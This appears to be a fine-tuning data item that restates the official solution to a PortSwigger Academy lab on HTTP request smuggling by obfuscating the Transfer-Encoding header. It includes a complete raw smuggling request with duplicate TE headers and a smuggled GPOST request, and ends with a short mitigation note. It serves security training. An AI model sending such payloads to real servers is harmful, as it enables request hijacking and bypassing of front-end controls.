# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

Teach me the official solution for this PortSwigger Academy lab.

Lab: HTTP request smuggling, obfuscating the TE header
Topic: HTTP request smuggling
Level: Practitioner

Scenario:
This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

Note

 Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers HTTP request smuggling: "HTTP request smuggling, obfuscating the TE header".

## Solution steps

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

 Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`
Note

 You need to include the trailing sequence `\r\n\r\n` following the final `0`.

 The second response should say: `Unrecognized method GPOST`.

## Vulnerability note

Underlying issue: HTTP request smuggling (CWE-444). Use a consistent, well-configured front-end/back-end HTTP stack; reject ambiguous Transfer-Encoding/Content-Length combinations.
